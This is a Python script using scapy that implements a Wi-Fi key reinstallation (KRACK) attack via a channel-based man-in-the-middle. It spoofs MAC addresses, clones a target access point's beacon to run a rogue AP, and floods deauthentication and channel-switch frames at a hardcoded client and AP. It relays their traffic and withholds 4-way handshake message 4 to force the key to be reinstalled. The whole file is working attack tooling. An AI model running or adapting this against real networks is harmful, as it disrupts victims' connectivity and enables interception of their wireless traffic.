import os
import select
import sys
import threading

from scapy.arch.linux import L2Socket
from scapy.data import ETH_P_ALL
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap, Dot11Deauth
from scapy.layers.eap import EAPOL
from scapy.packet import Raw
from scapy.sendrecv import sniff, sendp

from utils import Utils

iface_client = 'wlp2s0'
iface_ap = 'wlxc4e9841e1a74'
client_mac = 'c4:9a:02:57:30:23'
ap_mac = 'd4:35:1d:6c:e2:34'
ap_ssid = 'Avrahami'
ap_channel = 11
client_channel = 6
MAXTIMEOUT = 60
SEQ_NUM = 0
ap_beacon = None
ap_probe_response = None
sock_ap = None
sock_client = None
JAMMING = None
event_jamming = None
jamming_thread = None
PTK_INSTALLED = False

channels = {
    1: b"\x6c\x09",  # 2412
    2: b"\x71\x09",  # 2417
    3: b"\x76\x09",  # 2422
    4: b"\x7b\x09",  # 2427
    5: b"\x80\x09",  # 2432
    6: b"\x85\x09",  # 2437
    7: b"\x8a\x09",  # 2442
    8: b"\x8f\x09",  # 2447
    9: b"\x94\x09",  # 2452
    10: b"\x99\x09",  # 2457
    11: b"\x9e\x09",  # 2462
    12: b"\xa3\x09",  # 2467
    13: b"\xa8\x09",  # 2472
    14: b"\xb4\x09"  # 2484
}

channels_int = [
    'no channel 0',
    2412,
    2417,
    2422,
    2427,
    2432,
    2437,
    2442,
    2447,
    2452,
    2457,
    2462,
    2467,
    2472,
    2484
]


def print_green(string: str):
    print(f'\033[92m{string}\033[00m')


def print_red(string: str):
    print(f'\033[31m{string}\033[00m')


def print_blue(string: str):
    print(f'\033[34m{string}\033[00m')


def initialize_interfaces():
    def turn_down_iface(interface: str):
        os.system(f'ip link set {interface} down')

    def turn_up_iface(interface: str):
        os.system(f'ip link set {interface} up')

    def set_channel(interface: str, channel: int):
        print_blue(f'setting {interface} on channel {channel}')
        try:
            os.system(f'iwconfig {interface} channel {channel}')
        except Exception:
            print_red('channel setting failed.')
            sys.exit()
        print_green(f'interface {interface} is on channel {channel}')

    def set_monitor_mode(interface: str):
        print_blue(f'starting monitor mode for {interface}')
        try:
            os.system(f'iwconfig {interface} mode monitor')
        except Exception:
            print_red('could not start monitor mode')
            sys.exit()
        print_green(f'interface {interface} is on monitor mode')

    print_blue('turn off interfaces')
    # os.system('systemctl stop NetworkManager')
    turn_down_iface(iface_ap)
    turn_down_iface(iface_client)

    set_channel(iface_ap, ap_channel)
    set_channel(iface_client, client_channel)

    set_monitor_mode(iface_ap)
    set_monitor_mode(iface_client)

    print_blue('turn on interfaces')
    turn_up_iface(iface_ap)
    turn_up_iface(iface_client)


def get_ap_mac():
    print(f'trying to find {ap_ssid} MAC address')
    global ap_mac

    def check_ap(pkt):
        global ap_mac
        if pkt.haslayer(Dot11Beacon) and pkt[Dot11Elt].info.decode() == ap_ssid:
            ap_mac = pkt[Dot11].addr2
            return True

    sniff(iface=iface_ap, store=0, stop_filter=check_ap, timeout=MAXTIMEOUT)

    if ap_mac is None:
        # If AP MAC address could not be found
        print_red('could not retrieve AP MAC address')
        sys.exit()

    print_green(f'MAC address found {ap_mac}')


def get_ap_beacon():
    global ap_beacon

    def cb_get_ap_beacon(pkt):
        global ap_beacon

        if (pkt.haslayer(Dot11)
                and pkt.type == 0
                and pkt.subtype == 8  # Beacon
                and pkt[Dot11].addr3 == ap_mac):  # From AP
            ap_beacon = pkt
            ssid = 'Avrahami_Test'
            ap_beacon[Dot11Elt].info = ssid
            ap_beacon[Dot11Elt].len = len(ssid)
            set_channel(pkt, client_channel)
            print(ap_beacon.show())
            return True

    print_blue('Sniffing an AP Beacon...')
    sniff(iface=iface_ap, stop_filter=cb_get_ap_beacon, store=0, timeout=MAXTIMEOUT)
    if ap_beacon is None:
        # If AP Beacon could not be found
        print_red('Could not retreive an AP Beacon')
        sys.exit()
    print_green('AP Beacon saved!')


def set_ap_probe_response():
    def cb_get_ap_probe_response(packet):
        global ap_probe_response
        if (packet.haslayer(Dot11)
                and packet.type == 0
                and packet.subtype == 5  # Probe Response
                and packet[Dot11].addr1 == client_mac  # To client
                and packet[Dot11].addr2 == ap_mac):  # From AP
            ap_probe_response = packet
            return True

    global SEQ_NUM, ap_probe_response
    print('sniffing an AP Probe response...')
    sniff(iface=iface_ap, stop_filter=cb_get_ap_probe_response, store=0, timeout=MAXTIMEOUT)
    if ap_probe_response is None:
        print_red('Could not retreive an AP Probe response')
        sys.exit()
    print_green('AP Probe response saved!')
    SEQ_NUM = ap_probe_response[Dot11].SC


def set_interfaces_mac_address():
    global sock_ap, sock_client

    def set_iface_mac_address(interface: str, mac: str):
        print(f'updating {interface} MAC address to {mac} (Client MAC)')

        os.system(f'ip link set dev {interface} down')
        os.system(f'ip link set dev {interface} address {mac}')
        os.system(f'ip link set dev {interface} up')
        print_green(f'{interface} MAC address update successful')

    set_iface_mac_address(iface_ap, client_mac)
    set_iface_mac_address(iface_client, ap_mac)

    sock_ap = L2Socket(iface=iface_ap, type=ETH_P_ALL)
    sock_client = L2Socket(iface=iface_client, type=ETH_P_ALL)


def set_channel(pkt, channel):
    if pkt is not None and RadioTap in pkt:
        pkt[RadioTap].ChannelFrequency = channels_int[channel]


def send_ap_beacon():
    global SEQ_NUM, ap_beacon
    print_blue('Rogue AP started. Sending beacons...')
    set_channel(ap_beacon, client_channel)

    while True:
        SEQ_NUM += 1
        ap_beacon[RadioTap].SC = SEQ_NUM
        ap_beacon[Dot11].FCfield |= 0x20

        sendp(ap_beacon, iface=iface_ap, verbose=False)


def deauth(e):
    global SEQ_NUM

    pkts = []

    deauth_pkt1 = RadioTap() / Dot11(
        addr1=client_mac,
        addr2=ap_mac,
        addr3=ap_mac) / Dot11Deauth()
    deauth_pkt2 = RadioTap() / Dot11(
        addr1=ap_mac,
        addr2=client_mac,
        addr3=client_mac) / Dot11Deauth()

    '''
    Channel Switch Announcement
    + Dot11
        \x0d Action

    + Raw
        \x00 Management
        \x04 CSA
        \x25 Element ID [37]
        \x03 Length
        \x00 Channel Switch Mode
        \x04 New Channel Num
        \x00 Channel Switch Count
    '''
    csa_pkt = RadioTap() / Dot11(
        addr1=client_mac,
        addr2=ap_mac,
        addr3=ap_mac,
        type=0,
        subtype=0x0d) / Raw(f'\x00\x04\x25\x03\x00{chr(client_channel)}\x00')

    pkts.append(deauth_pkt1)
    pkts.append(deauth_pkt2)
    pkts.append(csa_pkt)

    # deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + bytes(channels[ap_channel], encoding='utf8') + deauth_pkt1[RadioTap].notdecoded[12:]
    # deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + bytes(channels[ap_channel], encoding='utf8') + deauth_pkt1[RadioTap].notdecoded[12:]

    print_blue(f'Starting deauth on AP {ap_mac} ({ap_ssid}) and client {client_mac}...')

    while not e.isSet():
        for p in pkts:
            SEQ_NUM += 1
            p[RadioTap].SC = SEQ_NUM
            p[Dot11].FCfield |= 0x20
            sendp(p, iface=iface_ap, inter=0.1 / len(pkts), verbose=False)

    print_red('Deauth stopped')


def update_ts(pkt):
    pkt[RadioTap].notdecoded = Utils.get_monotonic_str() + pkt[RadioTap].notdecoded[5:]


def send_to_client(pkt):
    global SEQ_NUM
    update_ts(pkt)
    set_channel(pkt, client_channel)

    SEQ_NUM += 1
    pkt[RadioTap].SC = SEQ_NUM

    # Hack to check injected data
    pkt[Dot11].FCfield |= 0x20

    sendp(pkt, iface=iface_client, verbose=False)


def analyze_traffic(pkt):
    # do not forward probe responses, we reply ourselves
    if pkt.type == 0 and pkt.subtype == 0x05:
        return 0

    # if pkt.type == 2 and pkt.subtype == 0x8 and pkt.haslayer(Raw):  # Data - QoS data
    if EAPOL in pkt:  # Data - QoS data
        if pkt[Raw].load[1:3] == b'\x00\x8a':  # Msg1
            print_green('4-way handshake : Message 1/4')
        elif pkt[Raw].load[1:3] == b'\x01\x0a':  # Msg2
            print_green('4-way handshake : Message 2/4')
        elif pkt[Raw].load[1:3] == b'\x13\xca':  # Msg3
            print_green('4-way handshake : Message 3/4')
        elif pkt[Raw].load[1:3] == b'\x03\x0a':  # Msg4
            print_green('4-way handshake : Message 4/4')
            return 0
        else:
            print_red("4-way handshake : UNKNOWN")

    if pkt[Dot11].FCfield & 0x20 != 0:
        return 0

    return 1


def send_to_ap(pkt):
    global SEQ_NUM
    update_ts(pkt)
    set_channel(pkt, ap_channel)

    SEQ_NUM += 1
    pkt[RadioTap].SC = SEQ_NUM

    # Hack to check injected data
    pkt[Dot11].FCfield |= 0x20

    sendp(pkt, iface=iface_ap, verbose=False)


def handle_pkt_client():
    def is_handshake_packet(pkt):
        return (pkt.type == 0
                and pkt.subtype == 4  # Probe Request
                and pkt[Dot11].addr2 == client_mac
                and pkt[Dot11].addr1 == "ff:ff:ff:ff:ff:ff")

    def find_channel(pkt):
        fq = pkt[RadioTap].ChannelFrequency
        return channels_int.index(fq)

    global SEQ_NUM, JAMMING, PTK_INSTALLED, jamming_thread, event_jamming
    pkt = sock_client.recv()

    # Drop useless packets
    if pkt is None or Dot11 not in pkt:
        return 0

    # print({
    #     'type': pkt.type,
    #     'subType': pkt.subtype,
    #     'addr': {
    #         1: pkt[Dot11].addr1,
    #         2: pkt[Dot11].addr2,
    #         3: pkt[Dot11].addr3
    #     },
    #     # 'channel': find_channel(pkt),
    #     'is_handshake_packet': is_handshake_packet(pkt)
    # })

    # Don't forward control frames
    if pkt.type == 1:  # TYPE_CNTRL
        return 0

    # Forward to AP or probe requests
    if (((pkt[Dot11].addr1 != ap_mac and pkt[Dot11].addr3 != ap_mac)
         or pkt[Dot11].addr2 != client_mac)
            or is_handshake_packet(pkt)):
        return 0

    # Probe Request, we reply ourselves
    if pkt.type == 0 and pkt.subtype == 0x04:  # Probe Request
        # Update Sequence Number

        print("Probe request to our AP")
        SEQ_NUM += 1
        ap_probe_response[Dot11].SC = SEQ_NUM
        send_to_client(ap_probe_response)

        return 0

    if JAMMING and pkt.type == 0 and (pkt.subtype == 0x00 or pkt.subtype == 0x0b) and find_channel(
            pkt) == client_channel:  # Association/Authentication
        event_jamming.set()
        # MitMed so no need for more Jamming
        print_red('Client authenticated to our AP!')
        JAMMING = False
        print_green('MitM attack has started')

    if pkt.type == 2 and pkt.subtype == 0x08:
        if Raw in pkt and pkt[Raw].load[1:3] == b'\x03\x0a':  # Msg4
            if not PTK_INSTALLED:
                print_green('PKT installed on client')
            else:
                print_green('PKT RE-installed on client! Key Reinstallation success!')
            PTK_INSTALLED = True

            # Don't forward, AP will think no response and send msg3 again
        else:
            # QoS Data maybe need to save
            pass

    # Check if pkt needs to be forwarded or not
    res = analyze_traffic(pkt)

    if res > 0:
        send_to_ap(pkt)


def handle_pkt_ap():
    global JAMMING
    pkt = sock_ap.recv()

    # Don't forward not Dot11 packets, or packets not sent to our client
    if (pkt is None
            or Dot11 not in pkt
            or pkt[Dot11].addr1 != client_mac
            or pkt[Dot11].addr2 != ap_mac):
        return 0

    # Don't forward control frames
    if pkt.type == 1:  # TYPE_CNTRL
        return 0

    # Don't forward CSA
    if pkt.subtype == 0x0d and Raw in pkt and pkt[Raw].load[1:3] == b'\x00\x04':
        return 0

    # Drop Beacons as we inject ours
    if pkt.type == 0 and pkt.subtype == 0x08:  # Beacon
        return 0

    # Check if pkt needs to be forwarded or not
    res = analyze_traffic(pkt)

    if res > 0:
        send_to_client(pkt)


def run():
    print_blue('Running main loop')

    while True:
        sel = select.select([sock_ap, sock_client], [], [], 1)
        if sock_client in sel[0]:
            handle_pkt_client()

        if sock_ap in sel[0]:
            handle_pkt_ap()


if __name__ == '__main__':
    initialize_interfaces()
    get_ap_mac()
    get_ap_beacon()
    set_ap_probe_response()
    set_interfaces_mac_address()

    ap_beacon_thread = threading.Thread(target=send_ap_beacon)
    ap_beacon_thread.setDaemon(True)
    ap_beacon_thread.start()

    event_jamming = threading.Event()
    jamming_thread = threading.Thread(target=deauth, args=(event_jamming,))
    jamming_thread.setDaemon(True)
    jamming_thread.start()
    JAMMING = True

    run()
